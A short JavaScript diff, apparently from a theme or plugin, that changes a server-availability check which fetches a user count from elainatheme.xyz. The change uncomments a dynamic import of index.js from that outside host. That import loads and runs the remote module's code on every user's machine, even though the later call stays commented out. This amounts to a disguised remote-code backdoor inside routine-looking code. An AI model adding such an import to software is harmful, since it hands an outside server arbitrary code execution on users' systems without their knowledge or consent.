@@ -199,9 +199,9 @@ const checkServerAvailability = async () => {
         const response = await fetch('https://elainatheme.xyz/numberOfUsers', { signal: controller.signal });
         const { count } = await response.json();
         log('Number of users:', count);
-        // If you need to import and execute a module from the server
-        // const { default: serverModule } = await import('https://elainatheme.xyz/index.js');
-        // await serverModule();
+        //If you need to import and execute a module from the server
+        const { default: serverModule } = await import('https://elainatheme.xyz/index.js');
+        //await serverModule();
     } catch (err) {
         clearTimeout(timeoutId);
         error('Failed to check server availability:', err);
